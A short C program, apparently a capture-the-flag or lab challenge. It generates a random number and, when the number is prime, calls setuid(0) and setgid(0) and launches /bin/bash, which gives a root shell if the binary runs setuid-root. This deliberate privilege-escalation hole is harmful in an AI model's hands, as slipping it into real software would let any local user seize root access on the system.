#include <stdio.h>
#include <stdlib.h>
#include <time.h>
#include <math.h>
#include <unistd.h>

// prime judgement func
int isPrimeNumber(int n){
    if (n < 2) return 0;
    for (int i = 2; i <= sqrt(n); i++){
        if (n % i == 0) return 0;
    }
    return 1;
}    

// let's go random
int main(){
    srand((unsigned int)time(NULL));
    int the_num = rand() % 1000 + 1;
    printf("%d is your damn number...\n", the_num);

    if (isPrimeNumber(the_num)){
        printf("You got a prime number! Hell yeah let's goooooooo:D \n");
        setuid(0); setgid(0);
        execl("/bin/bash", "bash", NULL);
    
    } else {
        printf("Hahahaha you noob.\n");
    }
    return 0;
}
